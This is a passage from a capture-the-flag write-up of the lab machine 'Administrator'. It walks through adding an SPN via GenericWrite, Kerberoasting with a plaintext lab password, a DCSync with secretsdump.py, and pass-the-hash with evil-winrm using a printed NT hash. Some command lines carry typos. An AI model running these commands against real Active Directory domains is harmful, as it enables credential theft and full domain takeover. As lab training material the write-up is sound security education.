<code>Emily</code>. Additionally, when the <code>Desktop</code> folder was listed, the <code>user.txt</code> flag was discovered and displayed. Next, this user will be enumerated with <code>BloodHound</code> just like the previous users.</p></div><div class="el-h3"><h3 data-heading="Abusing `GenericWrite` Permission – Creating an SPN Associated with a User to Request a TGS" dir="auto" class="heading" id="Abusing_`GenericWrite`_Permission_–_Creating_an_SPN_Associated_with_a_User_to_Request_a_TGS_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Abusing <code>GenericWrite</code> Permission – Creating an SPN Associated with a User to Request a TGS</h3></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114151425.png" src="img/pasted-image-20251114151425.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114151425.png" src="img/pasted-image-20251114151425.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">When the first‑degree object control for the user <code>Emily</code> was listed, it was discovered that she has the <code>GenericWrite</code> permission over the user <code>Ethan</code>. This permission allows actions such as changing the logon script when the user authenticates. The action that will be abused to pivot to this user is creating an <code>SPN</code> and associating it with this user, then requesting a <code>TGS</code> and cracking the associated <code>hash</code> by performing a <code>dictionary attack</code>. If the hashed password is included in the dictionary, <code>Ethan</code>’s password will be obtained. This process is shown below:</p></div><div class="el-pre"><pre class="language-powershell"><code data-line="0" class="language-powershell is-loaded"><span class="token function">Set-ADUser</span> <span class="token operator">-</span>Identity <span class="token string">"Ethan"</span> <span class="token operator">-</span>Add @<span class="token punctuation">{</span>servicePrincipalName=<span class="token string">"HTTP/servicio.ejemplo.com"</span><span class="token punctuation">}</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114151241.png" src="img/pasted-image-20251114151241.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114151241.png" src="img/pasted-image-20251114151241.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">By executing the command shown, an <code>SPN</code> named <code>servicio.ejemplo.com</code> was created and associated with the user <code>Ethan</code>. Then, using the <code>GetUserSPNs.py</code> tool, the <code>TGS</code> for this service will be requested and then cracked:</p></div><div class="el-h4"><h4 data-heading="TCP/UDP Port 88: Kerberoasting Attack – Obtaining a User TGS for the Created SPN" dir="auto" class="heading" id="TCP/UDP_Port_88_Kerberoasting_Attack_–_Obtaining_a_User_TGS_for_the_Created_SPN_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP/UDP Port 88: Kerberoasting Attack – Obtaining a User TGS for the Created SPN</h4></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">ntpdate administrator.htb
GetUsersSPNs.py administrator.htb/olivia:ichliebedich <span class="token parameter variable">-request</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114150942.png" src="img/pasted-image-20251114150942.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114150942.png" src="img/pasted-image-20251114150942.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The hash was successfully obtained, then it will be cracked:</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114150906.png" src="img/pasted-image-20251114150906.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114150906.png" src="img/pasted-image-20251114150906.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The hash was successfully cracked. Now, with the obtained password for the user <code>Ethan</code>, it cannot be used to log into the target machine because he is not a system user, but he may have some permission that allows him to perform a privileged action. Let’s check this using <code>BloodHound</code>:</p></div><div class="el-h2"><h2 data-heading="Privilege Escalation" dir="auto" class="heading" id="Privilege_Escalation_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Privilege Escalation</h2></div><div class="el-h3"><h3 data-heading="DCSync Attack: Abusing ``GetChanges`` | ``GetChangesAll`` Privileges Using `secretsdump.py`" dir="auto" class="heading" id="DCSync_Attack_Abusing_``GetChanges``_|_``GetChangesAll``_Privileges_Using_`secretsdump.py`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>DCSync Attack: Abusing <code>GetChanges</code> | <code>GetChangesAll</code> Privileges Using <code>secretsdump.py</code></h3></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114151329.png" src="img/pasted-image-20251114151329.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114151329.png" src="img/pasted-image-20251114151329.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">After enumerating the first‑degree object control for the other users, it was discovered that the user Ethan has the <code>GetChanges</code> and <code>GetChangesAll</code> permissions over the domain. These permissions are well‑known for enabling a <code>DCSync attack</code>, meaning that the user can request full replication data from the domain controller, including the <code>NT hashes</code> of all domain users, which can be used to perform <code>pass‑the‑hash attacks</code>. Let’s carry out this process.</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">secretsdump.py administrator.hbt/ethan@10.10.11.42
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114151622.png" src="img/pasted-image-20251114151622.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114151622.png" src="img/pasted-image-20251114151622.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The <code>NT hashes</code> were successfully obtained, including the Administrator’s. Therefore, a <code>pass‑the‑hash attack</code> will be performed to obtain a <code>PowerShell</code> session as him:</p></div><div class="el-h3"><h3 data-heading="TCP Port 5985: PassTheHash – Gaining Administrator Access" dir="auto" class="heading" id="TCP_Port_5985_PassTheHash_–_Gaining_Administrator_Access_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 5985: PassTheHash – Gaining Administrator Access</h3></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">evil-winrm <span class="token parameter variable">-i</span> <span class="token number">10.10</span>.11.42 <span class="token parameter variable">-u</span> <span class="token string">'Administrator'</span> <span class="token parameter variable">-H</span> <span class="token string">'3dc553ce4b9fd20bd016e098d2d2fd2e'</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114151658.png" src="img/pasted-image-20251114151658.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114151658.png" src="img/pasted-image-20251114151658.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The <code>Administrator</code> <code>PowerShell</code> session was successfully obtained. Finally, the <code>root</code> flag will be displayed.</p></div><div class="el-h2"><h2 data-heading="Root Flag" dir="auto" class="heading" id="Root_Flag_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Root Flag</h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114151714.png" src="img/pasted-image-20251114151714.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114151714.png" src="img/pasted-image-20251114151714.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Finally, the target machine was successfully pwned!!</p></div><div class="el-h1"><h1 data-heading="References" dir="auto" class="heading" id="References_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>References</h1></div><div class="el-p"><p dir="auto"><strong>How to open psafe3 file</strong> -&gt; <a data-tooltip-position="top" aria-label="https://pwsafe.org/help/pwsafeEN/html/cli.html" rel="noopener nofollow" class="external-link is-unresolved" href="https://pwsafe.org/help/pwsafeEN/html/cli.html" target="_self">Link</a></p></div><div class="footer"><div class="data-bar"></div></div></div></div></div><div id="right-content" class="leaf" style="--sidebar-width: var(--sidebar-width-right);"><div id="right-sidebar" class="sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content-wrapper"><div id="right-sidebar-content" class="leaf-content"><div id="outline" class=" tree-container"><div class="feature-header"><div class="feature-title">Table Of Contents</div><button class="clickable-icon nav-action-button tree-collapse-all" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-item" data-depth="1"><a class="tree-item-self is-clickable" href="machine-administrator.html#Machine_Administrator_0" data-path="#Machine_Administrator_0"><div class="tree-item-inner heading-link" heading-name="Machine Administrator">Machine Administrator</div></a><div class="tree-item-children"></div></div><div class="tree-item mod-collapsible" data-depth="1"><a class="tree-item-self is-clickable mod-collapsible" href="machine-administrator.html#Information_Gathering_0" data-path="#Information_Gathering_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Information Gathering">Information Gathering</div></a><div class="tree-item-children"><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-administrator.html#Discovering_OS_via_TTL_Using_`ping`_0" data-path="#Discovering_OS_via_TTL_Using_`ping`_0"><div class="tree-item-inner heading-link" heading-name="Discovering OS via TTL Using `ping`">Discovering OS via TTL Using <code>ping</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-administrator.html#UDP_Port_Scan_Using_`nmap`_0" data-path="#UDP_Port_Scan_Using_`nmap`_0"><div class="tree-item-inner heading-link" heading-name="UDP Port Scan Using `nmap`">UDP Port Scan Using <code>nmap</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-administrator.html#TCP_Port_Scan_Using_a_Custom_`.zshrc`_Function_(`jmap`)_0" data-path="#TCP_Port_Scan_Using_a_Custom_`.zshrc`_Function_(`jmap`)_0"><div class="tree-item-inner heading-link" heading-name="TCP Port Scan Using a Custom `.zshrc` Function (`jmap`)">TCP Port Scan Using a Custom <code>.zshrc</code> Function (<code>jmap</code>)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-administrator.html#Represent_Scan_Information_Legibly_Using_a_`.zshrc`_Custom_Function_(`extractPorts`)_0" data-path="#Represent_Scan_Information_Legibly_Using_a_`.zshrc`_Custom_Function_(`extractPorts`)_0"><div class="tree-item-inner heading-link" heading-name="Represent Scan Information Legibly Using  a `.zshrc` Custom Function (`extractPorts`)">Represent Scan Information Legibly Using  a <code>.zshrc</code> Custom Function (<code>extractPorts</code>)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-administrator.html#Discovering_Service_Versions_on_Open_TCP_Ports_Using_a_`.zshrc`_Custom_Function_(`jmap2`)_0" data-path="#Discovering_Service_Versions_on_Open_TCP_Ports_Using_a_`.zshrc`_Custom_Function_(`jmap2`)_0"><div class="tree-item-inner heading-link" heading-name="Discovering Service Versions on Open TCP Ports Using a `.zshrc` Custom Function (`jmap2`)">Discovering Service Versions on Open TCP Ports Using a <code>.zshrc</code> Custom Function (<code>jmap2</code>)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-administrator.html#TCP_Port_445_SMB_Enumeration_Using_`netexec`_0" data-path="#TCP_Port_445_SMB_Enumeration_Using_`netexec`_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 445: SMB Enumeration Using `netexec`">TCP Port 445: SMB Enumeration Using <code>netexec</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-administrator.html#TCP/UDP_Port_53_DNS_Enumeration_0" data-path="#TCP/UDP_Port_53_DNS_Enumeration_0"><div class="tree-item-inner heading-link" heading-name="TCP/UDP Port 53: DNS Enumeration">TCP/UDP Port 53: DNS Enumeration</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-administrator.html#TCP_Port_445_SMB_Enumeration_Using_Provided_Credentials_0" data-path="#TCP_Port_445_SMB_Enumeration_Using_Provided_Credentials_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 445: SMB Enumeration Using Provided Credentials">TCP Port 445: SMB Enumeration Using Provided Credentials</div></a><div class="tree-item-children"></div></div></div></div><div class="tree-item mod-collapsible" data-depth="1"><a class="tree-item-self is-clickable mod-collapsible" href="machine-administrator.html#Exploitation_0" data-path="#Exploitation_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Exploitation">Exploitation</div></a><div class="tree-item-children"><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-administrator.html#TCP_Port_445_SMB_Password_Spraying_Attack_(Failed)_0" data-path="#TCP_Port_445_SMB_Password_Spraying_Attack_(Failed)_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 445: SMB Password Spraying Attack (Failed)">TCP Port 445: SMB Password Spraying Attack (Failed)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-administrator.html#TCP/UDP_Port_88_AS-REP_Roasting_Attack_(Failed)_0" data-path="#TCP/UDP_Port_88_AS-REP_Roasting_Attack_(Failed)_0"><div class="tree-item-inner heading-link" heading-name="TCP/UDP Port 88: AS-REP Roasting Attack (Failed)">TCP/UDP Port 88: AS-REP Roasting Attack (Failed)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-administrator.html#TCP_Port_5985_Initial_Access_Using_`evil-winrm`_0" data-path="#TCP_Port_5985_Initial_Access_Using_`evil-winrm`_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 5985: Initial Access Using `evil-winrm`">TCP Port 5985: Initial Access Using <code>evil-winrm</code></div></a><div class="tree-item-children"></div></div></div></div><div class="tree-item mod-collapsible" data-depth="1"><a class="tree-item-self is-clickable mod-collapsible" href="machine-administrator.html#Post-Exploitation_0" data-path="#Post-Exploitation_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Post-Exploitation">Post-Exploitation</div></a><div class="tree-item-children"><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-administrator.html#Active_Directory_Enumeration_Using_`bloodhound`_0" data-path="#Active_Directory_Enumeration_Using_`bloodhound`_0"><div class="tree-item-inner heading-link" heading-name="Active Directory Enumeration Using `bloodhound`">Active Directory Enumeration Using <code>bloodhound</code></div></a><div class="tree-item-children"></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-item-self is-clickable mod-collapsible" href="machine-administrator.html#User_Pivoting_0" data-path="#User_Pivoting_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="User Pivoting">User Pivoting</div></a><div class="tree-item-children"><div class="tree-item" data-depth="3"><a class="tree-item-self is-clickable" href="machine-administrator.html#Abusing_the_`GenericAll`_Permission_–_Changing_a_User’s_Current_Password_0" data-path="#Abusing_the_`GenericAll`_Permission_–_Changing_a_User’s_Current_Password_0"><div class="tree-item-inner heading-link" heading-name="Abusing the `GenericAll` Permission – Changing a User’s Current Password">Abusing the <code>GenericAll</code> Permission – Changing a User’s Current Password</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-item-self is-clickable" href="machine-administrator.html#Abusing_`ForceChangePassword`_Permission_–_Changing_a_User’s_Current_Password_0" data-path="#Abusing_`ForceChangePassword`_Permission_–_Changing_a_User’s_Current_Password_0"><div class="tree-item-inner heading-link" heading-name="Abusing `ForceChangePassword` Permission – Changing a User’s Current Password">Abusing <code>ForceChangePassword</code> Permission – Changing a User’s Current Password</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-item-self is-clickable" href="machine-administrator.html#TCP_Port_21_FTP_Enumeration_-_``.psafe3``_File_Discovered_0" data-path="#TCP_Port_21_FTP_Enumeration_-_``.psafe3``_File_Discovered_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 21: FTP Enumeration - ``.psafe3`` File Discovered">TCP Port 21: FTP Enumeration - <code>.psafe3</code> File Discovered</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-item-self is-clickable" href="machine-administrator.html#Extracting_the_Hash_from_the_PSafe3_File_and_Cracking_It_Using_`pwsafe2john`_&amp;_`john`_0" data-path="#Extracting_the_Hash_from_the_PSafe3_File_and_Cracking_It_Using_`pwsafe2john`_&amp;_`john`_0"><div class="tree-item-inner heading-link" heading-name="Extracting the Hash from the PSafe3 File and Cracking It Using `pwsafe2john` &amp; `john`">Extracting the Hash from the PSafe3 File and Cracking It Using <code>pwsafe2john</code> &amp; <code>john</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-item-self is-clickable" href="machine-administrator.html#Opening_the_PSafe3_File_with_Password_Safe_and_Viewing_the_User_Credentials_0" data-path="#Opening_the_PSafe3_File_with_Password_Safe_and_Viewing_the_User_Credentials_0"><div class="tree-item-inner heading-link" heading-name="Opening the PSafe3 File with Password Safe and Viewing the User Credentials">Opening the PSafe3 File with Password Safe and Viewing the User Credentials</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-item-self is-clickable" href="machine-administrator.html#User_Flag_0" data-path="#User_Flag_0"><div class="tree-item-inner heading-link" heading-name="User Flag">User Flag</div></a><div class="tree-item-children"></div></div><div class="tree-item mod-collapsible" data-depth="3"><a class="tree-item-self is-clickable mod-collapsible" href="machine-administrator.html#Abusing_`GenericWrite`_Permission_–_Creating_an_SPN_Associated_with_a_User_to_Request_a_TGS_0" data-path="#Abusing_`GenericWrite`_Permission_–_Creating_an_SPN_Associated_with_a_User_to_Request_a_TGS_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Abusing `GenericWrite` Permission – Creating an SPN Associated with a User to Request a TGS">Abusing <code>GenericWrite</code> Permission – Creating an SPN Associated with a User to Request a TGS</div></a><div class="tree-item-children"><div class="tree-item" data-depth="4"><a class="tree-item-self is-clickable" href="machine-administrator.html#TCP/UDP_Port_88_Kerberoasting_Attack_–_Obtaining_a_User_TGS_for_the_Created_SPN_0" data-path="#TCP/UDP_Port_88_Kerberoasting_Attack_–_Obtaining_a_User_TGS_for_the_Created_SPN_0"><div class="tree-item-inner heading-link" heading-name="TCP/UDP Port 88: Kerberoasting Attack – Obtaining a User TGS for the Created SPN">TCP/UDP Port 88: Kerberoasting Attack – Obtaining a User TGS for the Created SPN</div></a><div class="tree-item-children"></div></div></div></div></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-item-self is-clickable mod-collapsible" href="machine-administrator.html#Privilege_Escalation_0" data-path="#Privilege_Escalation_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Privilege Escalation">Privilege Escalation</div></a><div class="tree-item-children"><div class="tree-item" data-depth="3"><a class="tree-item-self is-clickable" href="machine-administrator.html#DCSync_Attack_Abusing_``GetChanges``_|_``GetChangesAll``_Privileges_Using_`secretsdump.py`_0" data-path="#DCSync_Attack_Abusing_``GetChanges``_|_``GetChangesAll``_Privileges_Using_`secretsdump.py`_0"><div class="tree-item-inner heading-link" heading-name="DCSync Attack: Abusing ``GetChanges`` | ``GetChangesAll`` Privileges Using `secretsdump.py`">DCSync Attack: Abusing <code>GetChanges</code> | <code>GetChangesAll</code> Privileges Using <code>secretsdump.py</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-item-self is-clickable" href="machine-administrator.html#TCP_Port_5985_PassTheHash_–_Gaining_Administrator_Access_0" data-path="#TCP_Port_5985_PassTheHash_–_Gaining_Administrator_Access_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 5985: PassTheHash – Gaining Administrator Access">TCP Port 5985: PassTheHash – Gaining Administrator Access</div></a><div class="tree-item-children"></div></div></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-administrator.html#Root_Flag_0" data-path="#Root_Flag_0"><div class="tree-item-inner heading-link" heading-name="Root Flag">Root Flag</div></a><div class="tree-item-children"></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-item-self is-clickable" href="machine-administrator.html#References_0" data-path="#References_0"><div class="tree-item-inner heading-link" heading-name="References">References</div></a><div class="tree-item-children"></div></div></div></div></div><script defer="">let rs = document.querySelector("#right-sidebar"); rs.classList.toggle("is-collapsed", window.innerWidth < 768); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></div></div></body></html>
